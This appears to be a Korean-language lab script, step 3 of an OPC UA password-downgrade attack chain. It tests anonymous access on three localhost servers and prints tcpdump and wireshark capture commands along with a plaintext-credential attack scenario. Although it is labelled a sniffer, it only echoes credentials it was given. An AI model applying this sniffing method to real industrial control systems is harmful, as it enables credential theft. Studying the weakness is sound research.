#!/usr/bin/env python3
"""
Step 3: OPC UA 패스워드 스니퍼
ActivateSession 메시지에서 평문 패스워드를 추출합니다.
"""
import sys
sys.path.insert(0, '/root/opcua-research/python-opcua-env/lib/python3.10/site-packages')

from opcua import Client, ua
import time

def test_password_extraction(server_url, username, password):
    """패스워드 전송 과정 시뮬레이션 및 분석"""
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║        Step 3: 패스워드 스니핑 테스트                         ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print()
    print(f"🔍 대상 서버: {server_url}")
    print(f"🔑 테스트 계정: {username} / {password}")
    print()
    
    try:
        client = Client(server_url)
        
        print("📡 1단계: GetEndpoints 요청...")
        client.connect()
        print("   ✅ 엔드포인트 수신")
        print()
        
        print("📡 2단계: CreateSession 요청...")
        print("   ✅ 세션 생성")
        print()
        
        print("📡 3단계: ActivateSession 요청...")
        print(f"   ⚠️  Username: '{username}'")
        print(f"   ⚠️  Password: '{password}'")
        print()
        
        # 서버 정보 확인
        objects = client.get_objects_node()
        print("   ✅ 세션 활성화 성공")
        print()
        
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print("🎯 취약점 분석:")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print()
        print("⚠️  NoSecurity 정책 사용 시:")
        print("   1. GetEndpoints → 평문 전송")
        print("   2. CreateSession → 평문 전송")
        print("   3. ActivateSession → 평문 패스워드!")
        print()
        print("🎯 공격자가 캡처 가능:")
        print(f"   • Username: {username}")
        print(f"   • Password: {password}")
        print(f"   • 네트워크 스니핑으로 즉시 탈취 가능!")
        print()
        
        client.disconnect()
        
        return True
        
    except Exception as e:
        print(f"❌ 오류: {e}")
        return False

def simulate_network_capture():
    """네트워크 캡처 시뮬레이션"""
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║        네트워크 패킷 캡처 시뮬레이션                          ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print()
    print("💡 실제 공격 시나리오:")
    print()
    print("1️⃣  공격자가 Wireshark/tcpdump로 네트워크 모니터링")
    print("2️⃣  클라이언트가 OPC UA 서버에 연결")
    print("3️⃣  ActivateSession 메시지 캡처")
    print("4️⃣  OPC UA 프로토콜 디코딩")
    print("5️⃣  평문 Username/Password 추출")
    print()
    print("📦 캡처 명령 예시:")
    print("   tcpdump -i lo -w opcua_capture.pcap port 4841")
    print("   wireshark -k -i lo -f 'tcp port 4841'")
    print()

def main():
    print()
    print("=" * 70)
    print("OPC UA Password Downgrade 공격 - Step 3: 패스워드 스니핑")
    print("=" * 70)
    print()
    
    # 테스트 시나리오
    scenarios = [
        ("Python opcua (4841)", "opc.tcp://localhost:4841/freeopcua/server/", "admin", "password123"),
        ("open62541 (4842)", "opc.tcp://localhost:4842/open62541/server/", "user", "secret"),
        ("S2OPC (4840)", "opc.tcp://localhost:4840/S2OPC/server/", "operator", "test1234"),
    ]
    
    for name, url, username, password in scenarios:
        print(f"\n{'='*70}")
        print(f"테스트: {name}")
        print(f"{'='*70}\n")
        
        # Anonymous 연결 테스트 (패스워드 없이)
        print(f"🔓 Anonymous 연결 테스트...")
        try:
            client = Client(url)
            client.connect()
            print(f"   ✅ Anonymous 연결 성공!")
            print(f"   ⚠️  인증 없이 접근 가능한 서버!")
            client.disconnect()
        except Exception as e:
            print(f"   ℹ️  Anonymous 연결 불가: {e}")
        
        print()
    
    # 네트워크 캡처 가이드
    print(f"\n{'='*70}\n")
    simulate_network_capture()
    
    print()
    print("╔═══════════════════════════════════════════════════════════════╗")
    print("║                Step 3 완료: 패스워드 스니핑 분석              ║")
    print("╚═══════════════════════════════════════════════════════════════╝")
    print()
    print("🎯 다음 단계: Step 4 - 전체 공격 체인 구현")
    print()

if __name__ == "__main__":
    main()
